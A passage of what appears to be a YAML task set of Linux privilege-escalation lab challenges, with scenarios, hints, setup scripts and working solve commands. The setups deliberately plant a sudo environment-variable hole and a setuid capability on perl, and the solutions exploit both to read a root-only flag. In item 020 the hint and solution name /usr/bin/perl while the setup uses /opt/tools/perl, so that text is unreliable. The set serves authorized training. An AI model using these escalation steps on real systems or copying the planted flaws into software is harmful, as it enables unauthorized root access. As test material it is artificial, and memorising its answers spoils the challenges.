    check "a safe NOPASSWD rule for /usr/bin/id remains" 'grep -qE "NOPASSWD:[[:space:]]*/usr/bin/id" /lab/kl-sudoers'
  solve: |
    cat > /lab/kl-sudoers <<'EOF'
    %labs ALL=(root) NOPASSWD: /usr/bin/id
    EOF

- id: offsec-priv-019
  title: Environment variable to root
  difficulty: 4
  kind: build
  tags: [privesc, sudo, env]
  scenario: |
    `sudo -l` shows you can run a backup script, **`/usr/bin/kl-backup`**, as root
    with NOPASSWD, and that sudo **lets you keep the `BACKUP_TAR` variable**
    (`env_keep` + `SETENV`). The script runs whatever `BACKUP_TAR` points at —
    defaulting to `tar` — so if you set it, your program runs **as root**.

    Point `BACKUP_TAR` at your own program and make it read **`/root/flag.txt`**
    into **`/lab/flag.txt`**.
  hints:
    - "The script does `\"${BACKUP_TAR:-tar}\" ...`. Write a script that copies the flag, then run `sudo BACKUP_TAR=/tmp/evil /usr/bin/kl-backup`."
    - "`printf '#!/bin/bash\\ncat /root/flag.txt > /lab/flag.txt; chmod 644 /lab/flag.txt\\n' > /tmp/evil; chmod +x /tmp/evil; sudo BACKUP_TAR=/tmp/evil /usr/bin/kl-backup`"
  solution: |
    ```bash
    printf '#!/bin/bash\ncat /root/flag.txt > /lab/flag.txt; chmod 644 /lab/flag.txt\n' > /tmp/evil
    chmod +x /tmp/evil
    sudo BACKUP_TAR=/tmp/evil /usr/bin/kl-backup
    ```

    (Note `PATH` wouldn't work here — sudo's `secure_path` overrides it. The
    script trusting a *different* environment variable is what opens the door.)
  setup: |
    root_flag >/dev/null
    cat > /usr/bin/kl-backup <<'EOF'
    #!/bin/bash
    # VULNERABLE: runs a program named by an attacker-controllable env var
    : "${BACKUP_TAR:=tar}"
    cd /var/backups 2>/dev/null || cd /
    "$BACKUP_TAR" czf /tmp/kl-backup.tar.gz /etc/hostname 2>/dev/null
    EOF
    chmod 755 /usr/bin/kl-backup
    U=$(lab_user)
    cat > /etc/sudoers.d/kl-backupcmd <<EOF
    Defaults:$U env_keep += "BACKUP_TAR"
    $U ALL=(root) NOPASSWD: SETENV: /usr/bin/kl-backup
    EOF
    chmod 440 /etc/sudoers.d/kl-backupcmd
    on_reset 'rm -f /usr/bin/kl-backup /etc/sudoers.d/kl-backupcmd'
  check: |
    check "cannot read the flag directly" '! sudo -u "$(lab_user)" cat /root/flag.txt'
    check_flag
  solve: |
    printf '#!/bin/bash\ncat /root/flag.txt > /lab/flag.txt; chmod 644 /lab/flag.txt\n' > /tmp/evil
    chmod +x /tmp/evil
    sudo BACKUP_TAR=/tmp/evil /usr/bin/kl-backup

- id: offsec-priv-020
  title: Incident — from shell to root
  difficulty: 5
  kind: build
  tags: [privesc, incident, enumeration]
  scenario: |
    You've landed an unprivileged shell on a box during an authorized engagement.
    Objective: become root and recover the trophy at **`/root/flag.txt`**, written
    to **`/lab/flag.txt`**.

    No vector is named. Enumerate properly — `sudo -l`, SUID
    (`find / -perm -4000 -type f 2>/dev/null`), capabilities
    (`getcap -r / 2>/dev/null`), cron (`/etc/cron.d`), writable config — find the
    single intended path, and use it.
  hints:
    - "Check `sudo -l` first; then capabilities with `getcap -r / 2>/dev/null`."
    - "`/usr/bin/perl` has `cap_setuid+ep`. `perl -e 'use POSIX qw(setuid); setuid(0); exec \"cat /root/flag.txt\";'` — redirect to the flag file."
  solution: |
    Enumeration shows a capability on `perl`:

    ```bash
    getcap -r / 2>/dev/null                    # /usr/bin/perl cap_setuid+ep
    perl -e 'use POSIX qw(setuid); setuid(0); exec "cat","/root/flag.txt";' > /lab/flag.txt
    ```
  setup: |
    root_flag >/dev/null
    # intended path: a capability on a copy of perl under /opt
    install -d -m 755 /opt/tools
    cp /usr/bin/perl /opt/tools/perl 2>/dev/null || cp "$(command -v perl)" /opt/tools/perl
    setcap cap_setuid+ep /opt/tools/perl
    on_reset 'rm -rf /opt/tools'
  check: |
    check "cannot read the flag directly" '! sudo -u "$(lab_user)" cat /root/flag.txt'
    check_flag
  solve: |
    /opt/tools/perl -e 'use POSIX qw(setuid); setuid(0); exec "cat","/root/flag.txt";' > /lab/flag.txt
